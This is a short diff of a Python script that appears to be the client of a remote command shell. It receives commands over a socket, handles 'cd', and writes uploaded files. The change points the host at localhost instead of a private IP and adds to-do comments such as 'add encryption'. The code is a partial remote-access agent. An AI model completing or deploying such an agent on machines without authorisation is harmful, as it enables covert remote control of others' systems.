@@ -45,7 +45,7 @@ nc = pc * qc
 pu_k = [53, nc]
 pr_k = [557, nc]
 
-HOST = "10.0.5.198"
+HOST = "localhost"
 PORT = 5000
 BUFFER = 1024 * 62
 SEP = "<separator>"
@@ -74,6 +74,7 @@ while True:
 
     elif command[0:2].lower() == "cd":
         if command == "cd":
+            #### add command to go home dir
             continue
         if " " in command:
             cmd_div = command.split()
@@ -84,10 +85,10 @@ while True:
                 output = "Success!"
             else:
                 try:
+                    # Needs fixing 
                     print(cmd_div)
                     os.chdir(cmd_div[1])
                     output = "Success!"
-                    print("success!")
                 except FileNotFoundError as error:
                     output = str(error)
                 else:
@@ -95,6 +96,7 @@ while True:
         else:
             output = "Invalid command."
 
+    ## add encryption
     elif command[0:6].lower() == "upload":
         cmd_div = command.split()
         with open(cmd_div[1], "wb") as file:
